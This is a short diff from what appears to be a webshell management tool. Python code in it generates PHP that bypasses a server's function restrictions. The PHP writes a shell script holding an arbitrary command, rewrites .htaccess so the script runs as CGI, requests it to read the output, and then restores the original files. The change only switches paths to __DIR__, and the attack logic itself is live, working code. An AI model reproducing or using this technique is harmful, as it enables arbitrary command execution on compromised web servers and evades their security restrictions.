@@ -1651,9 +1651,9 @@ die('stream_socket_client function not exist or sock not exist');
 $shellcode = "#!/bin/sh\\n";
 $shellcode .= base64_decode("ZWNobyAtbmUgIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sXG5cbiIK");
 $shellcode .= "$cmd";
-$f=getcwd().DIRECTORY_SEPARATOR."%s";
-rename(".htaccess", ".htaccess.bak");
-file_put_contents('.htaccess', "Options +ExecCGI\\nAddHandler cgi-script .dh");
+$f=__DIR__.DIRECTORY_SEPARATOR."%s";
+rename(__DIR__.DIRECTORY_SEPARATOR.".htaccess", __DIR__.DIRECTORY_SEPARATOR.".htaccess.bak");
+file_put_contents(__DIR__.DIRECTORY_SEPARATOR.'.htaccess', "Options +ExecCGI\\nAddHandler cgi-script .dh");
 file_put_contents($f, $shellcode);
 chmod($f, 0777);
 print($f);
@@ -1672,7 +1672,7 @@ print($f);
         # request shellscript url and get result
         res = requests.get(shellscript_url)
         o = base64_encode(res.text.strip())
-        phpcode = """$o=base64_decode('%s');%sunlink('%s');unlink(".htaccess");rename(".htaccess.bak", ".htaccess");""" % (
+        phpcode = """$o=base64_decode('%s');%sunlink('%s');unlink(__DIR__.DIRECTORY_SEPARATOR.".htaccess");rename(__DIR__.DIRECTORY_SEPARATOR.".htaccess.bak", __DIR__.DIRECTORY_SEPARATOR.".htaccess");""" % (
             o, print_command, real_shellscript_name)
         return phpcode
     elif (bdf_mode == 12):
